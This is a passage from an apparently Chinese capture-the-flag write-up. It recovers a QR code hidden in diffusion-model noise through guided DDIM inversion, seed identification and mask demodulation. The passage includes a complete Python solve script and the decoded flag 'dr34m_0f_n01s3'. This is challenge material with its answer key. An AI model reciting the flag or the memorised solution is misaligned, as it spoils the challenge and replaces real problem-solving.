1.3611
1.4754
伪随机序列不匹配
np.random.default_rng(555)
0.2122
0.7168
完全吻合物理特征
本步结果：
确认载波生成器为 NumPy 现代生成器
np.random.default_rng(555).standard_normal((3, 32, 32))
。差分残差
在载荷区域表现出约
的幅值聚集，在非载荷区域收敛至背景噪声水平。
3.4 逐像素掩码解调与空间块特征聚合
关键观察：
题目采用掩码随机种子
mask_seed=20261012
对载荷进行“逐像素
调制”：
由于每个二维码模块在空间上被扩展为
像素块，解调后该
区域内的 4 个像素理论上应保持符号高度一致（全为正或全为负）。
原理与操作：
利用 QR 码固有的结构模块特征进行掩码生成方案甄别。二维码左上角 Finder Pattern 的第 0 行前 7 个模块全为黑块（理论解调值约为
），第 1 行内部模块为白块（理论解调值约为
）：
rng = np.random.default_rng(
20261012
)
mask = rng.choice([
-1.0
,
1.0
], size=(
3
,
32
,
32
))
unmasked = (x_T - G) * mask
测试各掩码生成方案在结构模块上的响应：
rng_choice / rng_integers
：第 0 行均值 **
**，第 1 行均值 **
**，与设计参数高度吻合。
其他旧版种子接口：均值趋近于 0，无法解调出同号块。
在解调后的特征图
上，对各
空间块执行均值池化以提升信噪比：
本步结果：
提取出的 625 个模块特征均值分布在
区间，正负极性分明，零值附近无杂散分布，彻底消除了扩散反演过程中累积的数值高频波动。
3.5 二维码矩阵重组与条码解析
关键观察：
根据模块映射布局：
深色模块（Dark）在隐写时注入
，浅色模块（Light）注入
。因此：
（
黑
色
模
块
）
（
白
色
模
块
）
原理与操作：
重构出
的二值矩阵，并在四周添加 4 模块宽度的标准静区（Quiet Zone），放大后保存为高清晰度 PNG 图像：
██████████████  ████  ██  ████  ██  ██████████████
██          ██  ██    ████  ██  ██  ██          ██
██  ██████  ██  ██      ██  ██  ██  ██  ██████  ██
██  ██████  ██      ██      ██  ██  ██  ██████  ██
██  ██████  ██    ██      ████  ██  ██  ██████  ██
██          ██  ██████████      ██  ██          ██
██████████████  ██  ██  ██  ██  ██  ██████████████
██  ██      ██
██████  ██  ████        ██    ██████    ██████
████      ██  ██  ██    ████  ████    ██  ██  ██
██  ██  ██  ██  ██    ██    ████  ████  ██  ██
██    ██      ████  ██  ██  ██      ██████
██  ██  ██████  ██████    ██        ████    ██  ██
████      ██      ██    ████████  ██  ██      ██
██  ██████████████      ████  ████  ██  ████  ████
██    ██  ██    ████  ████  ██      ████        ██
██  ██  ████████  ████████  ██████████████████████
████████████    ██      ██  ██
██████████████          ██      ██  ██  ██    ████
██          ██      ████████  ████      ██
██  ██████  ██  ████    ██    ████████████    ██
██  ██████  ██  ██      ████    ██  ██  ██  ██  ██
██  ██████  ██  ████      ██████  ██  ██    ██  ██
██          ██          ██      ██  ██    ██    ██
██████████████    ██████  ██      ████      ██████
左上、右上、左下三处 Finder Pattern 及第 6 行/列 Timing Pattern 均完美还原，无任何误码。使用
zxing-cpp
条码引擎扫描该图像。
本步结果：
成功解码出二维码承载的明文文本：
dr34m_0f_n01s3
4. 完整解题脚本
以下为独立完整的求解脚本。脚本自动完成模型构建、DDIM 导引不动点逆向反演、载波与掩码解调、二维码生成及结果解码：
import
os
import
sys
import
numpy
as
np
import
torch
import
torch.nn
as
nn
from
PIL
import
Image
from
diffusers
import
UNet2DModel, DDPMScheduler
import
zxingcpp
# ----------------- 1. 定义 ResNet-18 分类器网络 -----------------
def
conv3x3
(in_planes, out_planes, stride=
1
)
:
return
nn.Conv2d(in_planes, out_planes, kernel_size=
3
, stride=stride, padding=
1
, bias=
False
)
def
conv1x1
(in_planes, out_planes, stride=
1
)
:
return
nn.Conv2d(in_planes, out_planes, kernel_size=
1
, stride=stride, bias=
False
)
class
BasicBlock
(nn.Module)
:
expansion =
1
def
__init__
(self, inplanes, planes, stride=
1
, downsample=None)
:
super().__init__()
self.conv1 = conv3x3(inplanes, planes, stride)
self.bn1 = nn.BatchNorm2d(planes)
self.relu = nn.ReLU(inplace=
True
)
self.conv2 = conv3x3(planes, planes)
self.bn2 = nn.BatchNorm2d(planes)
self.downsample = downsample
self.stride = stride
def
forward
(self, x)
:
identity = x
out = self.relu(self.bn1(self.conv1(x)))
out = self.bn2(self.conv2(out))
if
self.downsample
is
not
None
:
identity = self.downsample(x)
return
self.relu(out + identity)
class
ResNet
(nn.Module)
:
def
__init__
(self, block, layers, num_classes=
10
)
:
super().__init__()
self.inplanes =
64
self.conv1 = nn.Conv2d(
3
,
64
, kernel_size=
3
, stride=
1
, padding=
1
, bias=
False
)
self.bn1 = nn.BatchNorm2d(
64
)
self.relu = nn.ReLU(inplace=
True
)
self.maxpool = nn.Identity()
self.layer1 = self._make_layer(block,
64
, layers[
0
])
self.layer2 = self._make_layer(block,
128
, layers[
1
], stride=
2
)
self.layer3 = self._make_layer(block,
256
, layers[
2
], stride=
2
)
self.layer4 = self._make_layer(block,
512
, layers[
3
], stride=
2
)
self.avgpool = nn.AdaptiveAvgPool2d((
1
,
1
))
self.fc = nn.Linear(
512
* block.expansion, num_classes)
def
_make_layer
(self, block, planes, blocks, stride=
1
)
:
downsample =
None
if
stride !=
1
or
self.inplanes != planes * block.expansion:
downsample = nn.Sequential(
conv1x1(self.inplanes, planes * block.expansion, stride),
nn.BatchNorm2d(planes * block.expansion),
)
layers = [block(self.inplanes, planes, stride, downsample)]
self.inplanes = planes * block.expansion
for
_
in
range(
1
, blocks):
layers.append(block(self.inplanes, planes))
return
nn.Sequential(*layers)
def
forward
(self, x)
:
x = self.maxpool(self.relu(self.bn1(self.conv1(x))))
x = self.layer4(self.layer3(self.layer2(self.layer1(x))))
return
self.fc(torch.flatten(self.avgpool(x),
1
))
class
CifarResNet18
(nn.Module)
:
def
__init__
(self)
:
super().__init__()
self.net = ResNet(BasicBlock, [
2
,
2
,
2
,
2
], num_classes=
10
)
self.register_buffer(
"mean"
, torch.tensor([
0.4914
,
0.4822
,
0.4465
]).view(
1
,
3
,
1
,
1
))
self.register_buffer(
"std"
, torch.tensor([
0.2470
,
0.2435
,
0.2616
]).view(
1
,
3
,
1
,
1
))
def
forward
(self, x)
:
return
self.net(((x +
1.0
) /
2.0
- self.mean) / self.std)
# ----------------- 2. DDIM 导引逆向反演采样器 -----------------
class
GuidedDDIM
:
def
__init__
(self, unet, scheduler, device, num_train=
1000
, steps=
100
)
:
self.unet = unet
self.device = device
self.ab = scheduler.alphas_cumprod.to(device=device, dtype=torch.float32)
self.ts = np.round(np.arange(
0
, steps) * (num_train / steps)).astype(int)
def
_eps
(self, x, t, guidance)
:
ab_t = self.ab[t]
with
torch.enable_grad():
xg = x.detach().requires_grad_(
True
)
eps = self.unet(xg, t).sample
x0 = (xg - (
1.0
- ab_t).sqrt() * eps) / ab_t.sqrt()
logp = torch.log_softmax(guidance[
"clf"
](x0.clamp(
-1.0
,
1.0
)), dim=
-1
)
g = torch.autograd.grad(logp[:, guidance[
"target"
]].sum(), xg)[
0
]
return
(eps - guidance[
"scale"
] * (
1.0
- ab_t).sqrt() * g).detach()
def
invert_fixedpoint
(self, x0_img, guidance, iters=
3
)
:
with
torch.enable_grad():
x = x0_img
ab_prev = torch.ones((), device=self.device)
for
i
in
range(len(self.ts)):
t = int(self.ts[i])
ab_t = self.ab[t]
A = (ab_prev / ab_t).sqrt()
B = (
1.0
- ab_prev).sqrt() - A * (
1.0
- ab_t).sqrt()
xt = x.clone()
for
_
in
range(iters):
eps = self._eps(xt, t, guidance)
xt = (x - B * eps) / A
x = xt
ab_prev = ab_t
return
x.detach()
# ----------------- 3. 主解题逻辑 -----------------
def
main
()
:
torch.set_num_threads(
12
)
device =
"cpu"
challenge_dir =
"C:/Users/34645/Downloads/uae/uae"
model_dir = os.path.join(challenge_dir,
"ddpm-cifar10-32"
)
# 1. 载入模型与分类器
unet = UNet2DModel.from_pretrained(model_dir)
for
p
in
unet.parameters(): p.requires_grad =
False
unet.eval()
sched = DDPMScheduler.from_pretrained(model_dir)
clf = CifarResNet18()
clf.load_state_dict(torch.load(os.path.join(challenge_dir,
"classifier.pt"
), map_location=device))
for
p
in
clf.parameters(): p.requires_grad =
False
clf.eval()
# 2. 读取对抗图像并执行不动点反演
x_adv = torch.from_numpy(np.load(os.path.join(challenge_dir,
"x_adv.npy"
))).unsqueeze(
0
)
guidance = {
"clf"
: clf,
"target"
:
3
,
"scale"
:
3.0
}
sampler = GuidedDDIM(unet, sched, device=device, steps=
100
)
print(
"[*] Running Guided DDIM fixed-point inversion..."
)
x_T = sampler.invert_fixedpoint(x_adv, guidance=guidance, iters=
3
).numpy()[
0
]
# 3. 构造载波与掩码，完成残差解调
G = np.random.default_rng(
555
).standard_normal((
3
,
32
,
32
))
mask = np.random.default_rng(
20261012
).choice([
-1.0
,
1.0
], size=(
3
,
32
,
32
))
unmasked = (x_T - G) * mask
# 4. 2x2 空间块聚合并重构 25x25 QR 矩阵
# 空间块重排: (3, 32, 32) -> (3, 16, 2, 16, 2) -> (768, 4)
blocks = unmasked.reshape(
3
,
16
,
2
,
16
,
2
).transpose(
0
,
1
,
3
,
2
,
4
).reshape(
768
,
4
)[:
625
]
module_values = blocks.mean(axis=
1
).reshape(
25
,
25
)
# 符号判决: 负值为深色模块(Dark/0), 正值为浅色模块(Light/255)
dark_modules = module_values <
0
# 5. 生成标准二维码并扫码
border =
4
qr_img_arr = np.pad(np.where(dark_modules,
0
,
255
).astype(np.uint8), border, constant_values=
255
)
qr_img = Image.fromarray(qr_img_arr).resize(((
25
+
2
* border) *
10
, (
25
+
2
* border) *
10
), Image.NEAREST)
qr_path =
"recovered_qr.png"
qr_img.save(qr_path)
print(
f"[*] Reconstructed QR saved to
{qr_path}
"
)
barcodes = zxingcpp.read_barcodes(qr_img)
for
b
in
barcodes:
print(
f"[+] Decoded Secret (
{b.format}
):
{b.text}
"
)
if
__name__ ==
"__main__"
:
main()
